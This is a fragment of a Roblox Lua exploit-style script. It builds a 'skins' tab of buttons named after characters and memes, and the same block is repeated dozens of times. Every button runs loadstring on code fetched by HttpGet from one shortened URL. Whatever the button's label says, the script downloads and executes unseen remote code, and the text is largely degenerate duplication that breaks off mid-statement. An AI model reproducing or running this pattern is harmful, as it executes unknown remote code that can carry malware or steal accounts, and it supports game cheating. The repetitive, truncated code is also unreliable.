    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="pop猫",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="无头",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="贝利亚",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="迪迦",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="塞巴斯蒂安",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="牢打",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="ikun",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
local Tab = Window:MakeTab({
    Name = "各大皮肤",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})
Tab:AddButton({
    Name ="神烦狗",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="断腿",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
    Name ="黄金气球",
    Callback = function()
    loadstring(game:HttpGet("https://shz.al/Zhpp"))()
    end
})
Tab:AddButton({
